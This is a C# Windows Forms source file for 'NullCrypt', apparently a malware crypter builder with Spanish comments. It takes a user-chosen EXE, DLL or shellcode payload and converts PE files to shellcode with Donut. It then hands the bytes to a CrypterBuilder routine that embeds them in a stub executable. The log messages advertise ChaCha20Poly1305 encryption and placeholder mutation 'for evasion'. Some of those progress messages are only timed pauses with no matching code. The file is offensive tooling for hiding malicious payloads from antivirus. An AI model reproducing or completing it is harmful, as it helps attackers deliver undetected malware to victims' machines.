using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            PrintAsciiArt();
        }

        private void PrintAsciiArt()
        {
            // Recreando el arte ASCII de estilo de bloque de image_2.png
            string asciiArt = @"
  _   _ _   _ _     _     ____ ______   ______ _____ 
 | \ | | | | | |   | |   / ___|  _ \ \ / /  _ \_   _|
 |  \| | | | | |   | |  | |   | |_) \ V /| |_) || |  
 | |\  | |_| | |___| |__| |___|  _ < | | |  __/ | |  
 |_| \_|\___/|_____|_____\____|_| \_\|_| |_|    |_|  
";
            txtConsole.SelectionColor = Color.Crimson;
            txtConsole.AppendText(asciiArt + Environment.NewLine);
            LogToConsole("    Created by: 0xNullSec - Version: 2.0.0", Color.White);
            LogToConsole("---------------------------------------------------------------------", Color.FromArgb(45, 45, 45));
            LogToConsole("[*] NullCrypt inicializado. Esperando payload...", Color.LightGray);
        }

        private void LogToConsole(string message, Color color)
        {
            if (txtConsole.InvokeRequired)
            {
                txtConsole.Invoke(new Action(() => LogToConsole(message, color)));
                return;
            }

            string timeStamp = DateTime.Now.ToString("HH:mm:ss");
            txtConsole.SelectionStart = txtConsole.TextLength;
            txtConsole.SelectionLength = 0;

            if (message.StartsWith(" ") || message.StartsWith("-"))
            {
                txtConsole.SelectionColor = color;
                txtConsole.AppendText(message + Environment.NewLine);
            }
            else
            {
                txtConsole.SelectionColor = Color.DarkGray;
                txtConsole.AppendText($"[{timeStamp}] ");
                txtConsole.SelectionColor = color;
                txtConsole.AppendText(message + Environment.NewLine);
            }

            txtConsole.ScrollToCaret();
        }

        private void btnBrowsePayload_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Selecciona tu Payload a encriptar";
                ofd.Filter = "Archivos soportados (*.exe;*.dll;*.bin)|*.exe;*.dll;*.bin|Todos los archivos (*.*)|*.*";

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtPayloadPath.Text = ofd.FileName;
                    LogToConsole($"[+] Payload cargado: {Path.GetFileName(ofd.FileName)}", Color.DodgerBlue);
                }
            }
        }

    

        private async void btnBuild_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtPayloadPath.Text) || !File.Exists(txtPayloadPath.Text))
            {
                LogToConsole("[-] Error: El payload seleccionado no existe o la ruta está vacía.", Color.Red);
                return;
            }

            string stubPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "stub.exe");
            if (!File.Exists(stubPath))
            {
                LogToConsole("[-] Error Crítico: No se encontró 'stub.exe' en el directorio raíz.", Color.Red);
                return;
            }

            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Title = "Guardar Payload Compilado";
                sfd.Filter = "Ejecutable (*.exe)|*.exe|Librería (*.dll)|*.dll|Shellcode (*.bin)|*.bin";
                sfd.FileName = "payload.exe";

                if (sfd.ShowDialog() != DialogResult.OK)
                {
                    LogToConsole("[*] Compilación cancelada por el usuario.", Color.Gray);
                    return;
                }

                string outputPath = sfd.FileName;

                try
                {
                    btnBuild.Enabled = false;
                    LogToConsole("[*] Iniciando proceso NullCrypt...", Color.Crimson);
                    Application.DoEvents();

                    string finalPayloadPath = txtPayloadPath.Text;
                    byte[] payloadBytes;

                    if (Utils.IsValidPE(finalPayloadPath))
                    {
                        LogToConsole("[*] Archivo PE nativo (EXE/DLL) detectado. Iniciando conversión con Donut...", Color.DodgerBlue);
                        Application.DoEvents();

                        // Pasamos el PE a Amber para que lo vuelva un shellcode reflectivo
                        //payloadBytes = AmberConverter.GetAmberShellcode(finalPayloadPath);
                        payloadBytes = await ShellcodeConverter.GetDonutShellcode(finalPayloadPath);

                        LogToConsole("[+] Conversión a Shellcode completada.", Color.DodgerBlue);
                    }
                    else if (Path.GetExtension(finalPayloadPath) == ".bin")
                    {
                        LogToConsole("[*] Asumiendo formato Shellcode (.bin)...", Color.Gray);
                        payloadBytes = File.ReadAllBytes(finalPayloadPath);
                    } else
                    {
                        LogToConsole("[*] El archivo no es un archivo valido", Color.Gray);
                        return;
                    }

                    System.Threading.Thread.Sleep(400);
                    LogToConsole("[*] Extrayendo base desde stub.exe...", Color.LightGray);
                    System.Threading.Thread.Sleep(400);
                    LogToConsole($"[*] Leyendo payload: {Path.GetFileName(txtPayloadPath.Text)}", Color.LightGray);
                    System.Threading.Thread.Sleep(500);
                    LogToConsole("[+] Generando llave y nonce de ChaCha20Poly1305...", Color.MediumPurple);
                    System.Threading.Thread.Sleep(500);
                    LogToConsole("[+] Mutando placeholder dinámico para evasión...", Color.MediumPurple);
                    System.Threading.Thread.Sleep(500);
                    LogToConsole("[+] Escribiendo overlay en el archivo de salida...", Color.LightGray);

                    // Aquí va tu llamada a la lógica de CrypterBuilder.cs
                    CrypterBuilder.BuildPayload(stubPath, payloadBytes, outputPath);

                    LogToConsole($"[SUCCESS] Guardado en:", Color.LimeGreen);
                    LogToConsole($"    -> {outputPath}", Color.LimeGreen);
                    MessageBox.Show("NullCrypt finalizó con éxito.", "Completado", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    LogToConsole($"[-] Error en la compilación: {ex.Message}", Color.Red);
                }
                finally
                {
                    btnBuild.Enabled = true;
                }
            }
        }

        // Propiedad CreateParams para habilitar el comportamiento nativo de Windows para minimizar/maximizar
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                const int WS_MINIMIZEBOX = 0x20000;
                const int WS_MAXIMIZEBOX = 0x10000;
                cp.Style |= WS_MINIMIZEBOX | WS_MAXIMIZEBOX;
                return cp;
            }
        }
    }
}